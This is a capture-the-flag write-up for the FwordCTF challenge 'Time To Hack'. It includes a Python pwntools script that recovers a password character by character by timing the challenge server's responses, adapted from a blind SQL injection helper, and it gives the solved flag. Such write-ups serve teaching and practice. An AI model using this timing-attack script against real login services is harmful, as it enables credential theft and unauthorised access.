**Time To Hack (misc, first blood)**

This challenge was extremely simple, but the lack of starting locations made this extremely guessy. I eventually figured out that the title of this challenge was hinting towards a timing attack. Knowing this, the password could be recovered by timing how long the response was between the guess and the "Incorrect" statement.

Credits to my teammate, [SuperStormer](https://github.com/SuperStormer/), who gave me this script used for blind sqli attacks.

```python
from pwn import *
import time
import string
import requests
r = remote("timetohack.fword.wtf", 1337)
def blind_sqli(inject_template, sqli_oracle, chars):
    """sqli_oracle takes a sql condition and returns if its true or false
    inject_template is the template for injecting into sqli_oracle"""
    val = ""
    while True:
        for c in chars:
            try:
                curr_val = val + c
                res = sqli_oracle(inject_template.format(curr_val))
                print(curr_val, res)
                if res:
                    val = curr_val
                    break
            except requests.exceptions.ConnectionError:  # really bad error handling
                time.sleep(1)
                break
        else:
            return val
def inject(s):
    r.recvuntil("> ")
    r.sendline("1")
    r.recvuntil("password:")
    start = time.time()
    r.sendline(s)
    r.recvline()
    end = time.time()
    return end - start > float(len(s))/2

blind_sqli("{}", inject, string.digits + string.ascii_letters + "_" + "}")
```

Flag: FwordCTF{_T1C-T0C_got_your_back_}
